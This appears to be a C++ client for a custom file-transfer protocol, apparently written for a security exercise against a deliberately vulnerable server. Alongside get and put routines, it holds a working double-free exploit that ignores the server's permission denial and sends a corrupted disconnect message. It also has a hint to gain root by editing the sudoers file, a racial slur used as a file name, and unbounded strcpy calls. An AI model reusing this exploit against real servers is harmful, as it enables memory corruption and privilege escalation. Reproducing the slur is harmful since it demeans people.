#include "client.h"
#include "utils.h"

using namespace std;

bool Client::setup()
{
    // create client socket
    _socket = socket(AF_INET, SOCK_STREAM, 0);
    if (_socket < 0)
    {
        cout << "[Client::setup] Failed to create socket, errno" << _socket << endl;
        return false;
    }

    // create server address (localhost)
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = DEFAULT_PORT;

    // connect socket
    int err = connect(_socket, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    if (err < 0)
    {
        cout << "[Client::setup] Error connecting socket, errno - " << err << endl;
        return false;
    }

    // set deafult timeout on client socket
    err = setsockopt(_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&TIMEOUT, sizeof(TIMEOUT));
    if (err != 0)
    {
        cout << "[Client::setup] Error setting timeout\n";
        return false;
    }

    _is_initialized = true;

    return true;
}

bool Client::execute(const client_command & command)
{
    // execute the requested command
    switch (command.command)
    {
        case (ECommandType::Get):
        {
            cout << "[Client::execute] Executing get command ... \n";
            return get(command.src_file, command.dest_dir);
        }

        case (ECommandType::PutFragments):
        {
            cout << "[Client::execute] Executing put (fragments) command ... \n";
            return put(command.src_file, command.dest_dir, EPutType::Fragments);
        }

        case (ECommandType::PutSingleBlock):
        {
            cout << "[Client::execute] Executing put (single block) command ... \n";
            return put(command.src_file, command.dest_dir, EPutType::SingleBlock);
        }

        case (ECommandType::AttackPrivilegeEscalation):
        {
            cout << "[Client::execute] Executing attack (privilege escalation) command ... \n";
            return attack_privilege_escalation();
        }

        case (ECommandType::AttackDoubleFree):
        {
            cout << "[Client::execute] Executing attack (double free) command ... \n";
            return attack_double_free();
        }

        default:
        {
            cout << "[Client::execute] Unknown command\n";
            return false;
        }
    }
}

bool Client::get(const string & src_file, const string & dest_dir)
{
    ssize_t len;
cout << "DEBUG GET dest dir :    " << dest_dir << endl;
    // send protocol start request
    ProtocolStartRequest start_request;
    start_request.type = EProtocolType::Get;
    len = send(_socket, reinterpret_cast<char *>(&start_request), sizeof(start_request), 0);
    if (len < 0)
    {
        cout << "[Client::get] Error sending protocol start request, errno - " << len << endl;
        return false;
    }

    // wait for protocol start response
    ProtocolStartResponse start_response;
    len = read(_socket, reinterpret_cast<char *>(&start_response), sizeof(start_response));
    if (len < 0)
    {
        cout << "[Client::get] Error reading protocol start response, errno - " << len << endl;
        return false;
    }

    if (len != sizeof(start_response) || start_response.header.size != sizeof(start_response) ||
        start_response.header.opcode != EOpcodes::ProtocolStartResponse)
    {
        cout << "[Client::get] Invalid protocol start response message\n";
        return false;
    }

    if (start_response.permission != EProtocolPermission::Allowed)
    {
        cout << "[Client::get] No permissions to exeucte get command\n";
        return false;
    }

    // send get request
    GetRequest get_request;
    strcpy(get_request.file_path, src_file.c_str());
    len = send(_socket, reinterpret_cast<char *>(&get_request), sizeof(get_request), 0);
    if (len < 0)
    {
        cout << "[Client::get] Error sending get request, errno - " << len << endl;
        return false;
    }

    // wait for get response
    GetResponse get_response;
    len = read(_socket, reinterpret_cast<char *>(&get_response), sizeof(get_response));
    if (len < 0)
    {
        cout << "[Client::get] Error reading get response, errno - " << len << endl;
        return false;
    }

    if (len != sizeof(get_response) || get_response.header.size != sizeof(get_response) ||
        get_response.header.opcode != EOpcodes::GetResponse)
    {
        cout << "[Client::get] Invalid get response message\n";
        return false;
    }

    if (get_response.status != EProtocolStatus::Success)
    {
        cout << "[Client::get] Get response status error - " << (int)get_response.status << endl;
        return false;
    }

    if (get_response.file_size > MAX_FILE_SIZE)
    {
        cout << "[Client::get] File too big - " << get_response.file_size << endl;
        return false;
    }

    // open file for writing (if exists we override the existing data in the file)
    string full_path = dest_dir + (dest_dir.back() == '/' ? "" : "/") + file_name_from_path(src_file);
    ofstream file(full_path, ios::binary | ios::trunc);
    if (!file.good())
    {
        cout << "[Client::get] Error opening file\n";
        return false;
    }

    size_t received_size = 0;
    EGetStates state = EGetStates::WaitForData;

    while (state != EGetStates::Finish)
    {
        switch (state)
        {
            case (EGetStates::WaitForData):
            {
                // read data fragment
                DataFragment fragment;
                len = read(_socket, reinterpret_cast<void *>(&fragment), sizeof(fragment));

                if (len < 0)
                {
                    cout << "[Client::get] Error reading data fragment - " << len << endl;
                    file.close();
                    return false;
                }

                if (fragment.header.opcode != EOpcodes::DataFragment || len != sizeof(fragment) ||
                    fragment.header.size != sizeof(fragment) || fragment.payload_len > FRAGMENT_SIZE)
                {
                    cout << "[Client::get] Invalid data fragment\n";
                    file.close();
                    return false;
                }

                if (fragment.payload_len + received_size > get_response.file_size)
                {
                    cout << "[Client::get] Too much data received\n";
                    file.close();
                    return false;
                }

                cout << "[Client::get] Got data fragment\n";

                // write data to file
                file.write(reinterpret_cast<char *>(fragment.payload), fragment.payload_len);
                received_size += fragment.payload_len;

                state = EGetStates::SendDataAck;
                break;
            }

            case (EGetStates::SendDataAck):
            {
                DataFragmentAck ack;
                ack.status = EProtocolStatus::Success;

                len = send(_socket, &ack, sizeof(ack), 0);
                if (len < 0)
                {
                    cout << "[Client::get] Error sending data fragment ack - " << len << endl;
                    file.close();
                    return false;
                }

                cout << "[Client::get] Sent data fragment ack\n";

                if (received_size == get_response.file_size)
                {
                    state = EGetStates::SendDisconnect;
                }
                else
                {
                    state = EGetStates::WaitForData;
                }

                break; 
            }

            case (EGetStates::SendDisconnect):
            {
                Disconnect disconnect;

                len = send(_socket, &disconnect, sizeof(disconnect), 0);
                if (len < 0)
                {
                    cout << "[Client::get] Error sending disconnect - " << len << endl;
                    return false;
                }

                cout << "[Client::get] Sent disconnect\n";
                state = EGetStates::Finish;
                break;
            }

            default:
            {
                cout << "[Client::get] Unknown state\n";
                return false;
            }
        }
    }

    file.close();
    return true;
}

bool Client::put(const string & src_file, const string & dest_dir, EPutType type)
{
    ssize_t len;

    // send protocol start request
    ProtocolStartRequest start_request;
    start_request.type = EProtocolType::Put;
    len = send(_socket, reinterpret_cast<char *>(&start_request), sizeof(start_request), 0);
    if (len < 0)
    {
        cout << "[Client::put] Error sending protocol start request, errno - " << len << endl;
        return false;
    }

    // wait for protocol start response
    ProtocolStartResponse start_response;
    len = read(_socket, reinterpret_cast<char *>(&start_response), sizeof(start_response));
    if (len < 0)
    {
        cout << "[Client::put] Error reading protocol start response, errno - " << len << endl;
        return false;
    }

    if (len != sizeof(start_response) || start_response.header.size != sizeof(start_response) ||
        start_response.header.opcode != EOpcodes::ProtocolStartResponse)
    {
        cout << "[Client::put] Invalid protocol start response message\n";
        return false;
    }

    if (start_response.permission != EProtocolPermission::Allowed)
    {
        cout << "[Client::put] No permissions to exeucte put command\n";
        return false;
    }

    // send put request
    PutRequest put_request;

    string server_file_path = dest_dir + (dest_dir.back() == '/' ? "" : "/") + file_name_from_path(src_file);
    strcpy(put_request.file_path, server_file_path.c_str());

    size_t file_size = filesize(src_file);
    put_request.file_size = file_size;
    put_request.put_type = type;

    len = send(_socket, reinterpret_cast<char *>(&put_request), sizeof(put_request), 0);
    if (len < 0)
    {
        cout << "[Client::put] Error sending put request, errno - " << len << endl;
        return false;
    }

    // wait for put response
    PutResponse put_response;
    len = read(_socket, &put_response, sizeof(put_response));
    if (len < 0)
    {
        cout << "[Client::put] Error reading put response, errno - " << len << endl;
        return false;
    }

    if (len != sizeof(put_response) || put_response.header.size != sizeof(put_response) ||
        put_response.header.opcode != EOpcodes::PutResponse)
    {
        cout << "[Client::put] Invalid put response\n";
        return false;
    }

    // open source file for reading
    ifstream file(src_file, ios_base::binary);
    if (!file.good())
    {
        cout << "[Client::put] Failed to open file\n";
        return false;
    }

    EPutStates state = EPutStates::SendData;
    size_t data_sent = 0;
    bool finished_sending = false;

    while (state != EPutStates::Finish)
    {
        switch (state)
        {
            case (EPutStates::SendData):
            {
                DataFragment fragment;

                if (!file.is_open())
                {
                    cout << "[Client::put] File not open for reading\n";
                    return false;
                }

                file.read((char*)fragment.payload, FRAGMENT_SIZE);
                fragment.payload_len = file ? FRAGMENT_SIZE : (size_t)file.gcount();

                len = send(_socket, &fragment, sizeof(DataFragment), 0);
                if (len < 0)
                {
                    cout << "[Client::put] Error sending data fragment - " << len << endl;
                    file.close();
                    return false;
                }

                data_sent += fragment.payload_len;
                cout << "[Client::put] Sent data fragment\n";
                finished_sending = (data_sent != file_size) ? false : true;

                state = EPutStates::WaitForDataAck;
                break;
            }

            case (EPutStates::WaitForDataAck):
            {
                DataFragmentAck ack;

                len = read(_socket, reinterpret_cast<void *>(&ack), sizeof(ack));
                if (len < 0)
                {
                    cout << "[Client::put] Error reading data fragment ack - " << len << endl;
                    file.close();
                    return false;
                }
                
                if (len != sizeof(DataFragmentAck) || ack.header.opcode != EOpcodes::DataFragmentAck
                    || ack.header.size != sizeof(DataFragmentAck))
                {
                    cout << "[Client::put] Invalid data fragment ack\n";
                    file.close();
                    return false;
                }

                if (ack.status == EProtocolStatus::Success)
                {
                    cout << "[Client::put] Got data fragment ack\n";
                    state = finished_sending ? EPutStates::SendDisconnect : EPutStates::SendData;
                }
                else
                {
                    cout << "[Session::get] Fragment ack bad status - " << (int)ack.status << endl;
                    file.close();
                    return false;
                }

                break;
            }

            case (EPutStates::SendDisconnect):
            {
                Disconnect disconnect;

                len = send(_socket, &disconnect, sizeof(disconnect), 0);
                if (len < 0)
                {
                    cout << "[Client::put] Error sending disconnect - " << len << endl;
                    return false;
                }

                cout << "[Client::put] Sent disconnect\n";
                state = EPutStates::Finish;
                break;
            }

            default:
            {
                cout << "[Client::put] Unknown state\n";
                return false;
            }
        }
    }

    file.close();
    return true;
}

bool Client::attack_privilege_escalation()
{
    cout << "Privilege Escalation attack is not available in this version.\n";
    cout << "You can however get the sudoers file, add yourself to it and put it back ;)\n";
    return true;
}

bool Client::attack_double_free()
{
    ssize_t len;

    // send protocol start request
    ProtocolStartRequest start_request;
    start_request.type = EProtocolType::Put;
    len = send(_socket, reinterpret_cast<char *>(&start_request), sizeof(start_request), 0);
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error sending protocol start request, errno - " << len << endl;
        return false;
    }

    // wait for protocol start response
    ProtocolStartResponse start_response;
    len = read(_socket, reinterpret_cast<char *>(&start_response), sizeof(start_response));
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error reading protocol start response, errno - " << len << endl;
        return false;
    }

    if (len != sizeof(start_response) || start_response.header.size != sizeof(start_response) ||
        start_response.header.opcode != EOpcodes::ProtocolStartResponse)
    {
        cout << "[Client::attack_double_free] Invalid protocol start response message\n";
        return false;
    }

    // fuck permissions
    if (start_response.permission != EProtocolPermission::Allowed)
    {
        // cout << "[Client::put] No permissions to exeucte put command\n";
        // return false;
    }

    // send put request
    PutRequest put_request;
    strcpy(put_request.file_path, "you_just_got_double_freed_nigga");
    put_request.file_size = FRAGMENT_SIZE;
    put_request.put_type = EPutType::SingleBlock; // the vulnerability is in the single block put protocol 

    len = send(_socket, reinterpret_cast<char *>(&put_request), sizeof(put_request), 0);
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error sending put request, errno - " << len << endl;
        return false;
    }

    // wait for put response
    PutResponse put_response;
    len = read(_socket, &put_response, sizeof(put_response));
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error reading put response, errno - " << len << endl;
        return false;
    }

    if (len != sizeof(put_response) || put_response.header.size != sizeof(put_response) ||
        put_response.header.opcode != EOpcodes::PutResponse)
    {
        cout << "[Client::attack_double_free] Invalid put response\n";
        return false;
    }

    // send a single data fragment
    DataFragment fragment;
    fragment.payload_len = FRAGMENT_SIZE;
    memset(fragment.payload, 0xA5, FRAGMENT_SIZE);

    len = send(_socket, reinterpret_cast<char *>(&fragment), sizeof(fragment), 0);
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error sending data fragment, errno - " << len << endl;
        return false;
    }

    // wait for data fragment ack
    DataFragmentAck ack;
    len = read(_socket, reinterpret_cast<void *>(&ack), sizeof(ack));
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error reading data fragment ack - " << len << endl;
        return false;
    }
    
    if (len != sizeof(DataFragmentAck) || ack.header.opcode != EOpcodes::DataFragmentAck
        || ack.header.size != sizeof(DataFragmentAck))
    {
        cout << "[Client::attack_double_free] Invalid data fragment ack\n";
        return false;
    }

    // send a corrupted disconnect message
    Disconnect disconnect;
    disconnect.header.size += 100;
    len = send(_socket, reinterpret_cast<char *>(&disconnect), sizeof(disconnect), 0);
    if (len < 0)
    {
        cout << "[Client::attack_double_free] Error sending corrupted disconnect, errno - " << len << endl;
        return false;
    }

    return true;
}